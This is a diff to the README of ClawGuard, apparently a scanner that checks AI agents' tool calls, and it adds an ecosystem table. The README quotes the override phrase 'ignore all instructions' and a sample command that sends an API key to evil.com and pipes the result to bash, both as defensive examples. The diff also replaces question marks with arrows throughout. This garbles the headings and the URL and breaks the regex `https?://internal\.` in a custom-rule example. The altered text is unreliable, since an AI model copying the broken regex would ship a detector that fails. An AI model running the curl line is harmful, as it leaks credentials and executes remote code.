@@ -46,9 +46,9 @@ $ npx @neuzhou/clawguard scan ./my-agent/
 
 ---
 
-## Why ClawGuard?
+## Why ClawGuard→
 
-Your AI agent has tools — shell, files, browser, APIs, secrets. Most guardrails scan **prompts**. ClawGuard scans **tool calls**. That's the difference between catching "ignore all instructions" and catching `curl http://evil.com?key=$API_KEY | bash`.
+Your AI agent has tools — shell, files, browser, APIs, secrets. Most guardrails scan **prompts**. ClawGuard scans **tool calls**. That's the difference between catching "ignore all instructions" and catching `curl http://evil.com→key=$API_KEY | bash`.
 
 ## Quick Start
 
@@ -81,7 +81,7 @@ No API keys. No cloud. No config. Just security.
 
 ---
 
-## Why ClawGuard, Not X?
+## Why ClawGuard, Not X→
 
 | | **ClawGuard** | **Guardrails AI** | **NeMo Guardrails** | **LLM Guard** |
 |---|---|---|---|---|
@@ -244,7 +244,7 @@ Define custom rules in JSON or YAML:
       "description": "Detect internal URLs in public code",
       "severity": "high",
       "category": "data-leakage",
-      "patterns": [{ "regex": "https?://internal\\." }],
+      "patterns": [{ "regex": "https→://internal\\." }],
       "action": "alert"
     }
   ]
@@ -610,3 +610,16 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 <p align="center">
   <strong>Your agent has tools. ClawGuard watches how it uses them.</strong> 🛡️
 </p>
+
+## 🔗 NeuZhou Ecosystem
+
+ClawGuard is part of the NeuZhou open source toolkit for AI agents:
+
+| Project | What it does | Link |
+|---------|-------------|------|
+| **repo2skill** | Convert any repo into an AI agent skill | [GitHub](https://github.com/NeuZhou/repo2skill) |
+| **ClawGuard** | Security scanner for AI agents | *You are here* |
+| **AgentProbe** | Behavioral testing framework for agents | [GitHub](https://github.com/NeuZhou/agentprobe) |
+| **FinClaw** | AI-powered financial intelligence engine | [GitHub](https://github.com/NeuZhou/finclaw) |
+
+**The workflow:** Generate skills with repo2skill → Scan for vulnerabilities with ClawGuard → Test behavior with AgentProbe → See it in action with FinClaw.
